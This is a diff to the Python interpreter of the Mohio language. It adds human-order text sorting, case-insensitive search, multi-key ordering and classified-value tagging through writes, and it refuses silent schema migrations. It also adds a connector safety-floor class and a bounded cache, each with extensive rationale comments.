@@ -36,6 +36,8 @@ Architecture:
 
 from __future__ import annotations
 import os, sys, json, sqlite3, datetime, traceback, re, uuid, math, statistics
+import unicodedata
+import copy as _copy
 from decimal import Decimal, ROUND_DOWN, ROUND_HALF_UP, InvalidOperation
 from dataclasses import dataclass, field, fields as _dc_fields
 from typing import Any, Optional
@@ -44,6 +46,8 @@ from pathlib import Path
 _HERE = Path(__file__).parent.resolve()
 sys.path.insert(0, str(_HERE))
 
+from mohio_classification import (
+    ENFORCED_CLASSIFIERS, RECOGNIZED_CLASSIFIERS, ClassificationResolver)
 from mohio_ast import *
 
 
@@ -134,33 +138,115 @@ def _cast_row(row):
     return row
 
 
+def _text_order_key(s):
+    """How a person alphabetises, not how bytes compare (Q60, 2026-09-01).
+
+    `order.up by name` used to sort by CODE POINT, so every capital letter sorted before every
+    lowercase one. Verified before the fix, on SQLite AND Postgres alike, because ordering
+    happens here in Python rather than in SQL:
+
+        Apple, Zebra, apple, banana        <- what a code-point sort gives
+        Apple, apple, banana, Zebra        <- what a person expects
+
+    Nobody asked for `Zebra` before `apple`. This is the language's job: a developer who writes
+    `order.up by name` is asking for the list a person would read, and the byte order is an
+    implementation detail leaking through.
+
+    CASE-INSENSITIVE via casefold, and ACCENT-INSENSITIVE by stripping combining marks, so
+    `resume` and `resume`-with-accents land together the way a reader expects rather than
+    separated by a hundred entries.
+
+    DELIBERATELY NOT `locale.strxfrm`, which is the textbook answer: it depends on the machine's
+    locale, so the SAME program would order differently on a developer's laptop and on the
+    server. A compiler cannot have that. The original string is the final tie-break, so the
+    result is deterministic everywhere and stable for equal-but-differently-cased values.
+    """
+    base = unicodedata.normalize('NFKD', s)
+    folded = ''.join(c for c in base if not unicodedata.combining(c)).casefold()
+    return (folded, s)
+
+
 def _sort_rows(rows, field, direction):
     reverse = direction in ('desc', 'down')
 
     def key(r):
         v = r.get(field) if isinstance(r, dict) else None
         if v is None:
-            return (2, 0.0, '')                # nulls grouped together
+            return (2, 0.0, ('', ''))          # nulls grouped together
         if isinstance(v, bool):
-            return (0, float(v), '')
+            return (0, float(v), ('', ''))
         if isinstance(v, (int, float)):
-            return (0, float(v), '')           # numbers sort numerically
-        return (1, 0.0, str(v))                # text after numbers, alphabetical
+            return (0, float(v), ('', ''))     # numbers sort numerically
+        return (1, 0.0, _text_order_key(str(v)))   # text after numbers, as a person reads it
 
     return sorted(rows, key=key, reverse=reverse)
 
 
-def _finalize_rows(rows, order_by=None, order_dir='asc', limit=None, offset=0):
+def _text_predicate(op, haystack, needle):
+    """`contains` / `starts` / `ends`, case-insensitively. ONE definition for all of them.
+
+    These were CASE-SENSITIVE, so `contains "e"` returned Ben, Dev and Eve while
+    `contains "E"` returned only Eve (measured 2026-09-02). Every search box in every Mohio
+    app was wrong by default, in the direction a person would never expect: a search is a
+    search, and nobody typing into one means "only if I guess the capitalisation".
+
+    THE FAMILY RULE, applied uniformly: the SEARCH predicates (contains / starts / ends)
+    ignore case. EQUALITY (`is`) does NOT -- identity comparison stays exact, because an id, a
+    token, a role name or a status code that matched case-insensitively would be a security
+    answer nobody asked for. That boundary is the rule, not an exception to it: search asks
+    "does this text contain that text", identity asks "is this the same value".
+
+    Case folding uses casefold(), not lower(): lower() gets German ss and several other
+    scripts wrong, and this is the same "a person reads it this way" standard the human
+    collation fix already set for ordering.
+
+    There were THREE separate implementations of these three operators (the `where` clause
+    matcher, the check/when condition evaluator, and the implicit-subject `when contains`
+    form). Fixing them separately would have been a fourth divergence waiting to happen, so
+    they all call this.
+    """
+    h = '' if haystack is None else str(haystack)
+    n = '' if needle is None else str(needle)
+    h, n = h.casefold(), n.casefold()
+    if op == 'contains':
+        return n in h
+    if op == 'starts':
+        return h.startswith(n)
+    if op == 'ends':
+        return h.endswith(n)
+    raise MohioRuntimeError(
+        f"`{op}` is not a text search predicate, so it cannot be answered here "
+        f"(it would otherwise be silently false).")
+
+
+def _finalize_rows(rows, order_by=None, order_dir='asc', limit=None, offset=0,
+                   order_keys=None):
     """Cast every returned row, then order + offset + limit in Python.
 
     offset defaults to 0, so callers that don't paginate behave exactly as
     before. When an offset is requested (pagination), find_many skips its SQL
     LIMIT and lets us apply offset + limit here, after ordering, so the page is
     correct whether or not the find was ordered.
+
+    `order_keys` is the FULL list of [(field, direction), ...] in the order written, most
+    significant first. Every ordering parameter here used to be singular -- one field, one
+    direction -- so a second `order.` clause simply overwrote the first and the primary key was
+    discarded with no error and a clean `mio check` (measured 2026-09-02: `order.up by dept` /
+    `order.down by name` sorted by name alone and ignored dept entirely).
+
+    Sorting runs LEAST significant key FIRST, relying on Python's stable sort, which is what
+    makes mixed directions work. A composite key would NOT: it breaks the moment two keys
+    disagree on direction, and would require negating the human-collation key for text, which
+    is not a thing a collation key supports. Ordering happens in Python on every backend, so
+    this is backend-neutral by construction -- the same reason the human-collation fix landed
+    everywhere at once.
     """
     rows = [_cast_row(r) for r in rows]
-    if order_by:
-        rows = _sort_rows(rows, order_by, order_dir)
+    keys = list(order_keys) if order_keys else ([(order_by, order_dir)] if order_by else [])
+    for field, direction in reversed(keys):
+        if field:
+            rows = _sort_rows(rows, field, direction)
+    order_by = order_by or (keys[0][0] if keys else None)
     if offset:
         rows = rows[int(offset):]
     if limit and (order_by or offset):
@@ -524,6 +610,67 @@ def log_runtime_error(info, verbose=False):
 # MOHIO RUNTIME VALUE
 # ══════════════════════════════════════════════════════════════
 
+class ClassifiedText(str):
+    """Text that remembers it came from a classified field.
+
+    WHY A STR SUBCLASS AND NOT A SIDE CHANNEL. `data_class` reached egress because the value
+    stayed wrapped in a MohioValue all the way there. It never reached a WRITE, because every
+    write verb unwraps to a plain Python value before building its field dict, and a plain `str`
+    cannot carry anything. Measured at the write seam, on a [phi] value copied into an untagged
+    column:
+
+        [WRITE SEAM] table=notes
+            body     type=str      data_class=None
+
+    The class was present one line earlier and dropped by the unwrap.
+
+    Seven write verbs build that dict, each with its own idiom, and the interpreter unwraps a
+    MohioValue in 124 places. Threading a parallel map from all seven to the write seam is the
+    hand-listed-family shape `_guard_write` was written to end: "A hand-listed family regrows one
+    member at a time." A value that carries its own class needs no list, and a write verb added
+    tomorrow inherits it.
+
+    It IS a str, so nothing downstream changes: comparison, concatenation, encoding, JSON,
+    database binding and the blind index HMAC all see the same characters. `str(x)` returns a
+    plain str, so `_bidx_of` hashes exactly the bytes it hashed before. Verified there is no
+    exact-type `type(v) is str` check anywhere in the interpreter that a subclass could break.
+    """
+
+    __slots__ = ('data_class', 'handling')
+
+    def __new__(cls, value, data_class=None, handling=None):
+        self = super().__new__(cls, value)
+        self.data_class = data_class
+        self.handling = handling
+        return self
+
+
+# Classes that mean "seal this on the way to disk". `phi` and `pci` are the coder's own tags;
+# `encrypted` is what a value carries after it was read back out of ciphertext, which says the
+# value was sealed without claiming to know which tag sealed it. Masking keeps its own, narrower
+# list, so this list governs storage only.
+_WRITE_SEALED_CLASSES = ('phi', 'pci', 'pii', 'encrypted')
+
+
+def value_handling_of(v):
+    """The handling rule a raw value carries, or None.
+
+    Read back, never inferred: this is the rule the coder declared on the field the value came
+    from, carried along with it.
+    """
+    return getattr(v, 'handling', None)
+
+
+def value_class_of(v):
+    """The classification a raw value carries, or None.
+
+    The ONLY question asked of a value at the write. It never inspects what the text says --
+    that would be guessing a class from content, which is inference and is forbidden. It reads
+    back a class the coder declared with a tag and the runtime attached at the read.
+    """
+    return getattr(v, 'data_class', None)
+
+
 class MohioValue:
     """
     Runtime value wrapper. All values in Mohio are MohioValue at runtime.
@@ -534,6 +681,15 @@ class MohioValue:
         self._value = value
         self._type  = mohio_type
         self.data_class = None   # e.g. 'pci' -> masked on display, full for use
+        # HANDLING IS NOT CLASSIFICATION. `data_class` says what a value IS, which decides
+        # masking and sealing; `handling` says what may be DONE with it, which decides refusal.
+        # A `never store` value is not phi and must not be masked or encrypted; it must be
+        # refused at a write. Folding them into one field would make each rule inherit the
+        # other's behaviour.
+        self.handling = None     # 'never_store' | 'never_log' -> refused at write / kept out of logs
+        # Which stretches of a JOINED string came from a classified field, so display can hide
+        # those and leave the text around them alone. Only a concatenation sets this.
+        self._masked_spans = None
         self._purposes = None    # [pii] collection purposes carried on the value (taint)
         self._purpose_fields = None  # which [pii] field name(s) this value came from
         self._currency = None    # currency code (USD/CAD/EUR/GBP) if this value is money; drives display
@@ -562,12 +718,40 @@ class MohioValue:
         if isinstance(self._value, str):
             if key in ('length', 'size', 'count'):
                 return MohioValue(len(self._value), 'number')
+        # Q59 (2026-08-31): a string operation on a value that is NOT a string used to fall
+        # through to `MohioValue(default)` -- blank. Not zero, not an error: NOTHING. And the
+        # value being a number is not usually the developer's doing. Storage columns are TEXT,
+        # so cast-on-read GUESSES a type back, and a numeric-looking string comes back a
+        # number: `phone "5551234567"` saved as text returns as an integer, and
+        # `show contact.phone.length` then prints blank instead of 10. The leading-zero guard
+        # saves `zip "07030"`, so the developer sees one field work and its neighbour silently
+        # do nothing -- which reads as their own mistake rather than a compiler one.
+        #
+        # The real fix is typed columns (carry the type, do not infer it back), re-ranked up
+        # and not built here. This stops the SILENT half now: say what the value actually is.
+        if key in ('length', 'size', 'count') and isinstance(self._value, (int, float, bool)):
+            _t = 'a boolean' if isinstance(self._value, bool) else 'a number'
+            raise MohioRuntimeError(
+                f"`.{key}` is a text operation, and this value is {_t} ({self._value!r}).\n"
+                f"    Storage columns are text, so a value that LOOKS numeric comes back as a "
+                f"number -- `phone \"5551234567\"` returns 5551234567, while `zip \"07030\"` "
+                f"stays text because of the leading zero.\n"
+                f"    Read it as text first -- `phone r.phone as.text` then `phone.length` "
+                f"gives 10 -- or store a value that cannot be mistaken for a number.")
         if hasattr(self._value, key):
             val = getattr(self._value, key)
             return MohioValue(None) if callable(val) else MohioValue(val)
         return MohioValue(default)
 
-    def to_python(self): return self._value
+    def to_python(self):
+        # A CLASSIFIED STRING KEEPS ITS CLASS THROUGH THE UNWRAP. This is the one seam where a
+        # tagged value stopped being distinguishable from any other text, and every write verb
+        # crosses it. Only str values carry it, and only for the two classes that mean
+        # protection at rest; everything else unwraps exactly as before.
+        if isinstance(self._value, str) and (self.data_class in _WRITE_SEALED_CLASSES
+                                             or self.handling is not None):
+            return ClassifiedText(self._value, self.data_class, self.handling)
+        return self._value
 
     def __repr__(self): return f"MohioValue({self._value!r}, {self._type!r})"
     def __bool__(self): return bool(self._value)
@@ -660,6 +844,21 @@ class Context:
         if name in self._constants: return self._constants[name]
         if self._parent:            return self._parent.get(name)
         return MohioValue(None)
+
+    def is_declared(self, name) -> bool:
+        """Does anything up the scope chain actually declare this name?
+
+        `get` cannot answer this: it returns MohioValue(None) for a name nobody declared, which
+        is the same thing it returns for a name declared and empty. A caller that has to tell a
+        typo from an empty value needs the question asked separately, so it is asked here.
+        Walks the chain the same way is_locked does.
+        """
+        ctx = self
+        while ctx is not None:
+            if name in getattr(ctx, '_vars', ()) or name in getattr(ctx, '_constants', ()):
+                return True
+            ctx = ctx._parent
+        return False
 
     def lock_name(self, name):
         """Mark a name as locked (created by `lock`): permanent, cannot change."""
@@ -824,6 +1023,31 @@ class Context:
                 if p == 'count':
                     root = MohioValue(len(root_py), 'number')
                     i += 1; continue
+                if p == 'distinct':
+                    # A LIST ADJECTIVE, not a query keyword. `colors.distinct` sits beside
+                    # `.first`, `.last` and `.count` and works on any list -- one built with
+                    # `create list`, one a `find` returned, one a task handed back. That is why
+                    # it is here and not in the query grammar: SELECT DISTINCT is a thing SQL
+                    # does to a result set, and copying the MECHANISM would tie "no duplicates"
+                    # to having a database, which is not what the word means.
+                    #
+                    # ORDER IS KEPT, first occurrence wins. A set would be faster and would
+                    # scramble the list, and a coder asking for the distinct colours is not
+                    # asking for them in a different order. Rows (dicts) are unhashable, so
+                    # sameness falls back to comparing the values themselves -- slower, and
+                    # correct, which is the right way round for a list a person will read.
+                    _seen, _out = set(), []
+                    for _item in root_py:
+                        try:
+                            if _item in _seen:
+                                continue
+                            _seen.add(_item)
+                        except TypeError:
+                            if any(_item == _prev for _prev in _out):
+                                continue
+                        _out.append(_item)
+                    root = MohioValue(_out, 'list')
+                    i += 1; continue
                 if p in ('position', 'pos') and i + 1 < len(parts):
                     # position.N / pos.N — 1-based always
                     try:
@@ -893,6 +1117,20 @@ class Context:
         if name in self._connections: return self._connections[name]
         return self._parent.get_connection(name) if self._parent else None
 
+    def open_connection_names(self):
+        """Every connection name open in this scope and its parents.
+
+        The registry has always stored connections BY NAME (`set_connection(name, c)`), and
+        `get_connection` has always taken a name -- but every query call site passes the
+        hardcoded default `'db'`. So `connect primary as sqlite ...` genuinely opened a
+        connection, and a `find` against it reported "none is open". This exists so the error
+        can tell the truth about what is actually open instead of guessing.
+        """
+        names = set(self._connections)
+        if self._parent is not None:
+            names |= set(self._parent.open_connection_names())
+        return names
+
     def get_env(self, key):
         return MohioValue(os.environ.get(key), 'text')
 
@@ -912,10 +1150,56 @@ class Context:
         self._roles = roles
         self._roles_verified = bool(verified)
 
+    # ── Scoped runtime state that must OUTLIVE a child scope ──────────────────────
+    # `child()` builds a fresh Context, so every attribute below reads as unset on a
+    # task body, a try body, or a stateless route handler. Roles already walked the
+    # parent chain (`has_role`, above); sector, profile, compliance and the current
+    # request did NOT, and every reader used a raw `getattr(ctx, '_sector', None)`
+    # that found the child's own None. The compliance gates therefore failed OPEN one
+    # scope in: raw SQL refused at top level under `sector: financial` RETURNED rows
+    # inside a task, and a `save` under a sector wrote ZERO audit records inside a
+    # task while reporting success. Real programs put their writes in tasks, so the
+    # normally-structured regulated app was the one that silently stopped complying.
+    # These accessors are the SAME parent-walking pattern as has_role -- one pattern
+    # for scoped state, not two.
+    # The walk itself lives in `scoped_attr` (module level, just below this class) so there is
+    # exactly ONE implementation. These methods are the Context-facing spelling of it, matching
+    # has_role above; the interpreter's readers call `scoped_attr` directly because a ctx there
+    # is not always a full Context (audit helpers are unit-tested with duck-typed doubles, which
+    # a method-only API would break). Same pattern, one walk, two spellings of the same call.
+    def sector(self):             return scoped_attr(self, '_sector')
+    def sector_profile(self):     return scoped_attr(self, '_sector_profile')
+    def sector_compliance(self):  return scoped_attr(self, '_sector_compliance')
+    def current_request(self):    return scoped_attr(self, '_current_request')
+
     def add_audit(self, entry):
         entry['_ts'] = datetime.datetime.utcnow().isoformat()
         self._audit_log.append(entry)
         if self._parent: self._parent.add_audit(entry)
+
+
+def scoped_attr(ctx, name):
+    """The value of a scoped attribute on `ctx` or the nearest ancestor that has it.
+
+    `Context.child()` builds a FRESH Context, so `_sector`, `_sector_profile`,
+    `_sector_compliance` and `_current_request` all read as None inside a task body, a
+    try body, or a stateless route handler. Every reader used a raw
+    `getattr(ctx, '_sector', None)` and found the child's own None, so the compliance
+    gates failed OPEN exactly one scope in: raw SQL that is refused at top level under
+    `sector: financial` RETURNED rows inside a task, and a `save` under a sector wrote
+    ZERO audit records inside a task while reporting success. Real programs put their
+    writes in tasks, so the normally-structured regulated app was the one that silently
+    stopped complying.
+
+    Walks by getattr rather than by calling a method, so it also resolves correctly for
+    the duck-typed ctx doubles the audit helpers are unit-tested with.
+    """
+    while ctx is not None:
+        val = getattr(ctx, name, None)
+        if val is not None:
+            return val
+        ctx = getattr(ctx, '_parent', None)
+    return None
 
 
 # ══════════════════════════════════════════════════════════════
@@ -978,7 +1262,161 @@ def _spec_to_mongo(spec):
     return {'$and': ands} if ands else {}
 
 
-class DbRuntime:
+# The blind-index shadow-column suffix. Module level because BOTH the storage layer
+# (ensure_table's drift check) and the interpreter (which synthesises the columns)
+# need it, and two copies would drift.
+_BIDX_SUFFIX = '__bidx'
+
+
+def _sink_call(fn, *args, **kw):
+    """Call a SINK method, passing `allow_new_columns` only if that sink accepts it.
+
+    The audit sink is a PLUGGABLE SEAM: a provider (or a test double) supplies its own
+    object implementing `ensure_table`/`save`. Those implement the signature that existed
+    when they were written, so handing them a keyword added later (MIGRATION-REFUSAL,
+    2026-08-30) raises TypeError and the record is rejected -- which surfaced as a
+    compliance ALERT and a lost audit row, not as an obvious crash. Mohio's own runtimes
+    take the keyword; anyone else's need not, and must not be required to.
+    """
+    import inspect
+    try:
+        params = inspect.signature(fn).parameters
+    except (TypeError, ValueError):
+        params = {}
+    if 'allow_new_columns' not in params and not any(
+            p.kind == inspect.Parameter.VAR_KEYWORD for p in params.values()):
+        kw.pop('allow_new_columns', None)
+    return fn(*args, **kw)
+
+
+class _QueryableRuntime:
+    """The SAFETY FLOOR every data runtime must satisfy -- ours and anyone else's.
+
+    THE FINDING THAT FORCED THIS (2026-09-01). Field validation existed ONLY on SQLite. On
+    Postgres -- the PRODUCTION backend, live on getmohio and zork -- a `where` or `order by`
+    naming a column that does not exist silently returned the wrong rows. The dev backend had
+    the guardrail and production did not, which is the worst possible arrangement: every local
+    test passes and the deployed app is the one that lies.
+
+    THE PRINCIPLE. A safety behaviour re-implemented per runtime is a safety behaviour that
+    every NEW runtime silently ships without -- and the person connecting a third-party
+    database never learns that the floor did not come with it. So the CONTRACT lives here,
+    once, above the runtimes, and each runtime supplies only the primitive it alone can know:
+    its own column list.
+
+    THE CONTRACT, in two parts:
+      1. `table_columns(table)` -- the runtime's real columns, or None when the table does not
+         exist yet. The default below RAISES: a runtime that has not implemented it cannot
+         silently pass validation, which would move the fail-open one level up and hide it
+         better.
+      2. `supports_field_validation` -- False only where the concept genuinely does not apply
+         (a schemaless store), and then it must say WHY in `field_validation_note`. That is a
+         DECLARED exemption, recorded and greppable, not an accidental absence.
+
+    `assert_satisfies_safety_floor` (below) is called when a connection is made, so a
+    connector that satisfies neither part fails at CONNECT -- before it can answer a single
+    query unvalidated -- rather than at some later moment that looks like a data problem.
+    """
+
+    supports_field_validation = True
+    field_validation_note = ""
+
+    def table_columns(self, table):
+        raise MohioRuntimeError(
+            f"{type(self).__name__} cannot report the columns of '{table}', so Mohio cannot "
+            f"check that a field you filter or sort by actually exists.\n"
+            f"    Every data connector must either report its schema (`table_columns`) or "
+            f"declare that the idea does not apply to it (`supports_field_validation = False` "
+            f"with a reason).\n"
+            f"    Serving the query anyway would mean a misspelled field silently returns the "
+            f"wrong rows -- which is what this floor exists to stop.")
+
+    def _validate_fields(self, table, field_names):
+        """Fail loud if any of `field_names` is not a real column on `table`.
+
+        ONE implementation, shared by every backend. A missing TABLE is a separate,
+        already-handled case, so this returns quietly when the table does not exist yet and
+        never fights that distinction.
+        """
+        if not self.supports_field_validation:
+            return
+        names = [f for f in (field_names or []) if f]
+        if not names:
+            return
+        cols = self.table_columns(table)
+        if cols is None:
+            return
+        import difflib
+        for f in names:
+            if f not in cols:
+                suggestion = difflib.get_close_matches(f, list(cols), n=1)
+                hint = f" Did you mean '{suggestion[0]}'?" if suggestion else ""
+                # NAME THE REAL COLUMNS. "Field 'x' does not exist" tells the reader what is
+                # wrong and not what is right, so the next step is a guess or a trip to the
+                # schema. The close-match hint only fires on a near miss; the full list is what
+                # answers the question in every other case. Capped so a wide table does not
+                # bury the error it is explaining.
+                _cols = list(cols)
+                _shown = ", ".join(_cols[:12]) + (
+                    f", ... ({len(_cols)} columns)" if len(_cols) > 12 else "")
+                raise MohioRuntimeError(
+                    f"Field '{f}' does not exist in db.{table}.{hint}"
+                    f" The columns on db.{table} are: {_shown}.")
+
+
+def assert_satisfies_safety_floor(runtime, driver_name):
+    """Refuse, at CONNECT time, a data connector that brings no safety floor with it.
+
+    Checked here rather than inside each runtime so a connector nobody in this repo wrote is
+    held to the same line. Silently serving unvalidated queries is the connector-scale version
+    of the SQLite-only bug this floor replaces.
+    """
+    if not isinstance(runtime, _QueryableRuntime):
+        raise RuntimeError(
+            f"the '{driver_name}' connector does not implement Mohio's data-safety floor.\n"
+            f"    A connector must inherit `_QueryableRuntime`, which is what guarantees that "
+            f"a field you filter or sort by is checked against the real schema before the "
+            f"query runs.\n"
+            f"    Without it a misspelled field silently returns the wrong rows, and nothing "
+            f"anywhere says so.")
+    if runtime.supports_field_validation:
+        return
+    if not getattr(runtime, 'field_validation_note', ''):
+        raise RuntimeError(
+            f"the '{driver_name}' connector switches field validation OFF without saying why.\n"
+            f"    Set `field_validation_note` to the reason. An exemption that is written down "
+            f"can be reviewed; one that is merely absent cannot.")
+
+
+def _schema_drift_error(table, new_cols, existing_cols):
+    """The message for a write naming a field the table does not have.
+
+    MIGRATION-REFUSAL (2026-08-30). `ensure_table` used to run ALTER TABLE ADD COLUMN for any
+    field it had not seen, before every write. That made the schema whatever you happened to
+    write rather than what you declared, and it turned a routine RENAME into silent data
+    corruption: `email` -> `email_address` left half the rows under each name, with no error
+    and no warning, and every later query silently missed half the data.
+
+    Adding the column is the dangerous half, because it always succeeds. Refusing is the
+    recoverable one.
+    """
+    fields = ', '.join(f"'{c}'" for c in sorted(new_cols))
+    plural = 's' if len(new_cols) > 1 else ''
+    known = ', '.join(sorted(existing_cols)) or '(none yet)'
+    return (
+        f"field{plural} {fields} not in db.{table}, so this write was refused.\n"
+        f"    db.{table} has: {known}\n"
+        f"    Mohio will not add a column to an existing table on the fly. Doing that "
+        f"silently makes the schema whatever the last write happened to say -- and a renamed "
+        f"field ends up as TWO columns with half the rows in each, which no later query can "
+        f"see past.\n"
+        f"    If this is a typo, fix the field name. If the table really should have "
+        f"{fields}, change it deliberately: Mohio has no migration command yet "
+        f"(`mio schema generate` only prints the schema), so alter the table directly in your "
+        f"database, or drop it and let Mohio recreate it if the data is disposable.")
+
+
+class DbRuntime(_QueryableRuntime):
     def __init__(self, db_path=':memory:'):
         # check_same_thread=False: the connection is created once and cached, but the
         # ASGI server runs sync request handlers in a worker threadpool, so a later
@@ -1024,23 +1462,12 @@ class DbRuntime:
         self._column_cache[table] = cols
         return cols
 
-    def _validate_fields(self, table, field_names):
-        """Fail loud if any of `field_names` is not a real column on `table`. A missing TABLE
-        is a separate, already-handled case (retrieve_one's own "no such table" carve-out,
-        find_many/count's fail-loud) -- this validator skips silently when the table itself
-        doesn't exist yet, so it never fights that existing distinction."""
-        cols = self._table_columns(table)
-        if cols is None:
-            return
-        import difflib
-        for f in field_names:
-            if f not in cols:
-                suggestion = difflib.get_close_matches(f, cols, n=1)
-                hint = f" Did you mean '{suggestion[0]}'?" if suggestion else ""
-                raise MohioRuntimeError(
-                    f"Field '{f}' does not exist in db.{table}.{hint}")
+    def table_columns(self, table):
+        """The safety floor's primitive for SQLite. The VALIDATION logic lives once, on
+        `_QueryableRuntime`; this supplies only the thing SQLite alone can answer."""
+        return self._table_columns(table)
 
-    def ensure_table(self, table, columns, id_value=None):
+    def ensure_table(self, table, columns, id_value=None, allow_new_columns=False):
         # Universal record id: every table gets a primary-key "id". When the app or a
         # seed supplies its own id, that value wins. An auto-increment INTEGER key rejects
         # a string id like "M001" with a datatype mismatch, so if a non-integer id is being
@@ -1066,9 +1493,20 @@ class DbRuntime:
         # new seed/template columns) is applied instead of silently ignored by
         # CREATE TABLE IF NOT EXISTS.
         existing = {r[1] for r in self.conn.execute(f'PRAGMA table_info("{table}")')}
-        for c in field_cols:
-            if c not in existing:
-                self.conn.execute(f'ALTER TABLE "{table}" ADD COLUMN "{c}" TEXT')
+        missing = [c for c in field_cols if c not in existing]
+        # MIGRATION-REFUSAL: only INTERNAL callers (seed data, audit-log sinks) may widen a
+        # table that already exists. A user write that names an unknown field is refused --
+        # see _schema_drift_error for why adding it silently is the dangerous direction.
+        #
+        # The blind-index shadow columns are the exception, and not a loophole: `<field>__bidx`
+        # is SYNTHESISED by the encryption layer for a [pii]/[pci]/[phi] field, never typed by
+        # a developer, so it can appear on an existing table without anyone having renamed
+        # anything. Refusing it would break tagging a field on a table that already has rows.
+        _drift = [c for c in missing if not str(c).endswith(_BIDX_SUFFIX)]
+        if _drift and existing and not allow_new_columns:
+            raise MohioRuntimeError(_schema_drift_error(table, _drift, existing - {'id'}))
+        for c in missing:
+            self.conn.execute(f'ALTER TABLE "{table}" ADD COLUMN "{c}" TEXT')
         # Invalidate the field-validation cache: this table's real schema may have just
         # widened (a new column added), and a stale cached set would fail loud on a field
         # that genuinely exists now. getattr guards a DbRuntime built via __new__() that
@@ -1106,8 +1544,16 @@ class DbRuntime:
             raise
 
     def find_many(self, table, where=None, limit=None,
-                  order_by=None, order_dir='asc', offset=0):
-        self._validate_fields(table, list((where or {}).keys()))
+                  order_by=None, order_dir='asc', offset=0, order_keys=None):
+        # Q18 (2026-08-31): the SORT field gets the same validation the FILTER fields already
+        # get. `order.up by nosuchcol` used to return the rows unsorted with no error at all --
+        # ordering happens in Python (`_sort_rows` does `r.get(field)`), so an unknown name
+        # simply produced None for every row and they all tied. The developer asked for an
+        # order, got insertion order, and nothing said the field did not exist. Same
+        # no-validation root as the `where` case this validator was written for.
+        self._validate_fields(table, list((where or {}).keys())
+                              + [f for f, _d in (order_keys or ([(order_by, order_dir)]
+                                                                if order_by else [])) if f])
         try:
             clauses, params = [], []
             for f, v in (where or {}).items():
@@ -1122,7 +1568,7 @@ class DbRuntime:
             if limit and not order_by and not offset: sql += f' LIMIT {limit}'
             cur = self.conn.execute(sql, params)
             raw = [dict(r) for r in cur.fetchall()]
-            return _finalize_rows(raw, order_by, order_dir, limit, offset)
+            return _finalize_rows(raw, order_by, order_dir, limit, offset, order_keys)
         except sqlite3.OperationalError as e:
             # A MISSING TABLE is an operational failure, NOT an empty result. Surface it so the
             # find routes to on.failure -- "table doesn't exist" and "found zero rows" look identical
@@ -1156,10 +1602,11 @@ class DbRuntime:
                 raise
             return 0
 
-    def save(self, table, fields):
+    def save(self, table, fields, allow_new_columns=False):
         from mohio_audit_grades import assert_write_allowed as _awa
         _awa(table)          # audit relations only via the chaining path
-        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'))
+        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'),
+                          allow_new_columns=allow_new_columns)
         cols = ', '.join(f'"{k}"' for k in fields)
         phs  = ', '.join('?' for _ in fields)
         cur  = self.conn.execute(
@@ -1363,7 +1810,8 @@ class DbRuntime:
         Returns the new row id, or None when an existing row meant nothing was inserted."""
         from mohio_audit_grades import assert_write_allowed as _awa
         _awa(table)
-        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'))
+        self.ensure_table(table, list(fields.keys()), id_value=fields.get('id'),
+                          allow_new_columns=False)
         cols = ', '.join(f'"{k}"' for k in fields)
         phs  = ', '.join('?' for _ in fields)
         where = ' AND '.join(f'"{c}" = ?' for c in key_cols)
@@ -1385,25 +1833,283 @@ class DbRuntime:
 # POSTGRES RUNTIME
 # ══════════════════════════════════════════════════════════════
 
-class PostgresRuntime:
+import collections as _collections
+import threading as _threading
+import time as _pooltime
+
+
+class _BoundedCache:
+    """One bounded in-memory store, deliberately built ONCE (Q66, 2026-09-01).
+
+    THE OOM VECTOR IT CLOSES: `miocache.set` wrote into a plain dict that was never bounded and
+    never expired, so every key set for the life of a process stayed for the life of that
+    process. A cache keyed per user, per request or per row -- which is what a cache is FOR --
+    grew until the process died. On a hosted runtime serving other people's apps, one app's loop
+    was enough.
+
+    THE SECOND BUG IT CLOSES: `miocache.set "k" v for 10 minutes` has ALWAYS parsed. The grammar
+    has carried `(_FOR NUMBER time_unit)?` all along, the transformer dropped it, and the
+    executor never looked for it -- so a developer who declared an expiry got a value that never
+    expired, with nothing said. An unbounded cache is a resource bug; a silently-ignored expiry
+    is a correctness one, because the program's own statement of intent was discarded.
+
+    BUILT AS A STORE, NOT AS PART OF miocache, because `FEATURE-QUERY-CACHE` is meant to wire
+    into the SAME store. Two bounded caches with two eviction policies is how the second one
+    ends up unbounded.
+
+    Eviction is least-recently-USED, not least-recently-written: a hot key that keeps being read
+    should outlive a cold one written after it, or the cap evicts exactly the entries the cache
+    exists to keep.
+    """
+
+    def __init__(self, max_entries=None):
+        self.max_entries = int(max_entries if max_entries is not None
+                               else os.environ.get("MOHIO_CACHE_MAX_ENTRIES", 10000))
+        self._data = _collections.OrderedDict()  # key -> (value, expires_at | None)
+        self._lock = _threading.Lock()
+        self.evictions = 0                        # observable, so a cap being hit is knowable
+
+    def set(self, key, value, ttl_seconds=None):
+        expires = (_pooltime.time() + float(ttl_seconds)) if ttl_seconds else None
+        with self._lock:
+            self._data[key] = (value, expires)
+            self._data.move_to_end(key)
+            self._evict()
+
+    def get(self, key, default=None):
+        """(found, value). Expiry is checked on READ, so a key that has passed its own declared
+        lifetime is a miss even if nothing has swept it."""
+        with self._lock:
+            entry = self._data.get(key)
+            if entry is None:
+                return False, default
+            value, expires = entry
+            if expires is not None and _pooltime.time() >= expires:
+                del self._data[key]
+                return False, default
+            self._data.move_to_end(key)
+            return True, value
+
+    def exists(self, key):
+        found, _ = self.get(key)
+        return found
+
+    def delete(self, key):
+        with self._lock:
+            self._data.pop(key, None)
+
+    def clear(self):
+        with self._lock:
+            self._data.clear()
+
+    def __len__(self):
+        with self._lock:
+            return len(self._data)
+
+    def _evict(self):
+        """Expired entries first -- they are free to drop and losing them costs nothing. Only
+        once those are gone does the cap start discarding live entries, so a cache full of
+        stale keys does not evict its useful ones."""
+        now = _pooltime.time()
+        if len(self._data) > self.max_entries:
+            for k in [k for k, (_v, e) in self._data.items() if e is not None and now >= e]:
+                del self._data[k]
+        while len(self._data) > self.max_entries:
+            self._data.popitem(last=False)
+            self.evictions += 1
+
+
+class _PoolExhausted(RuntimeError):
+    """Raised when no connection became free within the acquire deadline."""
+
+
+def _pool_is_exhausted(exc):
+    """True when this exception means 'no free connection', not 'the database is broken'."""
+    return 'exhaust' in str(exc).lower() or type(exc).__name__ == 'PoolError'
+
+
+def _pool_settings():
+    """Pool size and acquire timeout, env-tunable. Mirrors the other MOHIO_* floors."""
+    def _int(name, default):
+        raw = (os.environ.get(name) or '').strip()
+        try:
+            v = int(raw)
+            return v if v > 0 else default
+        except ValueError:
+            return default
